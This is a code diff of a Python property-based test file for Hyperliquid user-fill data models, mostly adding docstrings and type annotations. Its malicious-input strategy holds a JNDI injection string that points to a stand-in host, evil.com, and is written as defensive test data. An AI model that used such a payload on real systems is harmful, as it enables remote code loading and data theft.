@@ -1,7 +1,7 @@
 """Property-based tests for Hyperliquid raw user fills models.
 
 These tests validate critical security boundary models that process external user fill data.
-The models tested here are essential for trade execution tracking, fee calculation, and position management.
+The models tested here are essential for trade execution, fees, and position management.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious fill data that could manipulate P&L calculations
@@ -34,13 +34,20 @@ from cyberdelta.apis.hyperliquid.models.hl_raw_user_fills import (
 from cyberdelta.exceptions.parsing import EmptyStringError, ParsingError
 
 
+# Type alias for malicious input types to avoid long lines
+MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR USER FILLS MODEL TESTING
 # =============================================================================
 
 
 def decimal_str_strategy() -> SearchStrategy[str]:
-    """Generate valid decimal strings for prices and amounts."""
+    """Generate valid decimal strings for prices and amounts.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
         st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
@@ -62,7 +69,11 @@ def decimal_str_strategy() -> SearchStrategy[str]:
 
 
 def positive_decimal_str_strategy() -> SearchStrategy[str]:
-    """Generate valid positive decimal strings."""
+    """Generate valid positive decimal strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.decimals(min_value=Decimal(0), max_value=Decimal(1000000), places=8).map(str),
         st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
@@ -76,12 +87,20 @@ def positive_decimal_str_strategy() -> SearchStrategy[str]:
 
 
 def trade_id_strategy() -> SearchStrategy[int]:
-    """Generate valid trade IDs."""
+    """Generate valid trade IDs.
+
+    Returns:
+        SearchStrategy[int]: Strategy for generating test data.
+    """
     return st.integers(min_value=0, max_value=2**63 - 1)
 
 
 def coin_symbol_strategy() -> SearchStrategy[str]:
-    """Generate valid coin symbols."""
+    """Generate valid coin symbols.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.sampled_from(["BTC", "ETH", "SOL", "USDC", "USDT", "AVAX", "ATOM", "DOT"]),
         st.text(
@@ -99,12 +118,20 @@ def coin_symbol_strategy() -> SearchStrategy[str]:
 
 
 def side_strategy() -> SearchStrategy[str]:
-    """Generate valid order side values."""
+    """Generate valid order side values.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.sampled_from(["B", "S", "A"])  # Buy, Sell, Ask
 
 
 def direction_strategy() -> SearchStrategy[str]:
-    """Generate valid direction values."""
+    """Generate valid direction values.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.sampled_from(["Buy", "Sell", "long", "short"]),
         st.text(min_size=1, max_size=64),  # Direction is a string field
@@ -112,7 +139,11 @@ def direction_strategy() -> SearchStrategy[str]:
 
 
 def hash_strategy() -> SearchStrategy[str]:
-    """Generate valid transaction hash strings."""
+    """Generate valid transaction hash strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Standard hex hashes
         st.text(alphabet="0123456789abcdef", min_size=64, max_size=64).map(lambda x: f"0x{x}"),
@@ -125,7 +156,11 @@ def hash_strategy() -> SearchStrategy[str]:
 
 
 def client_order_id_strategy() -> SearchStrategy[str | None]:
-    """Generate valid client order ID strings."""
+    """Generate valid client order ID strings.
+
+    Returns:
+        SearchStrategy[str | None]: Strategy for generating test data.
+    """
     return st.one_of([
         st.none(),  # Optional field
         st.text(
@@ -142,7 +177,11 @@ def client_order_id_strategy() -> SearchStrategy[str | None]:
 
 
 def eth_address_strategy() -> SearchStrategy[str]:
-    """Generate valid Ethereum address strings."""
+    """Generate valid Ethereum address strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Standard Ethereum addresses
         st.just("0xabcdefabcdefabcdefabcdefabcdefabcdefabcd"),
@@ -160,7 +199,11 @@ def eth_address_strategy() -> SearchStrategy[str]:
 
 @st.composite
 def valid_user_fill_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid user fill data."""
+    """Generate valid user fill data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "tid": draw(trade_id_strategy()),
         "coin": draw(coin_symbol_strategy()),
@@ -181,15 +224,23 @@ def valid_user_fill_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_user_fills_request_data(draw: st.DrawFn) -> dict[str, str]:
-    """Generate valid user fills request payload data."""
+    """Generate valid user fills request payload data.
+
+    Returns:
+        dict[str, str]: Generated test data.
+    """
     return {
         "type": "userFills",
         "user": draw(eth_address_strategy()),
     }
 
 
-def malicious_fills_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for fills security testing."""
+def malicious_fills_strategy() -> SearchStrategy[MaliciousInput]:
+    """Generate malicious values for fills security testing.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Fill manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-fills}"),
@@ -243,7 +294,7 @@ class TestHyperliquidRawUserFillProperties:
 
     @given(fill_data=valid_user_fill_data())
     def test_user_fill_validation_success_properties(self, fill_data: dict[str, Any]) -> None:
-        """Property: Valid user fill data should always create valid fill objects."""
+        """Property: Valid data should create valid fill objects."""
         # Skip invalid data
         assume(isinstance(fill_data["tid"], int) and fill_data["tid"] >= 0)
         assume(isinstance(fill_data["oid"], int) and fill_data["oid"] >= 0)
@@ -332,10 +383,10 @@ class TestHyperliquidRawUserFillProperties:
         malicious_value=malicious_fills_strategy(),
     )
     def test_user_fill_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: User fill should reject malicious inputs safely."""
-        base_data = {
+        """Property: User fill should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "tid": 1,
             "coin": "ETH",
             "px": "100.0",
@@ -541,7 +592,7 @@ class TestHyperliquidRawUserFillsResponseProperties:
     def test_user_fills_response_validation_success_properties(
         self, fills: list[dict[str, Any]]
     ) -> None:
-        """Property: Valid fills list should always create valid response objects."""
+        """Property: Valid data should create valid response objects."""
         valid_fills = []
 
         for fill_data in fills:
@@ -603,7 +654,9 @@ class TestHyperliquidRawUserFillsResponseProperties:
             st.none(),  # None instead of list
         ])
     )
-    def test_user_fills_response_type_validation_properties(self, invalid_root: Any) -> None:
+    def test_user_fills_response_type_validation_properties(
+        self, invalid_root: MaliciousInput
+    ) -> None:
         """Property: User fills response should reject non-list inputs."""
         with pytest.raises((ValidationError, TypeError)):
             HyperliquidRawUserFillsResponse.model_validate(invalid_root)
@@ -626,7 +679,7 @@ class TestHyperliquidRawUserFillsRequestPayloadProperties:
     def test_user_fills_request_validation_success_properties(
         self, request_data: dict[str, str]
     ) -> None:
-        """Property: Valid request data should always create valid request objects."""
+        """Property: Valid data should create valid request objects."""
         # Validate user address
         user = request_data["user"]
         assume(isinstance(user, str) and user.startswith("0x"))
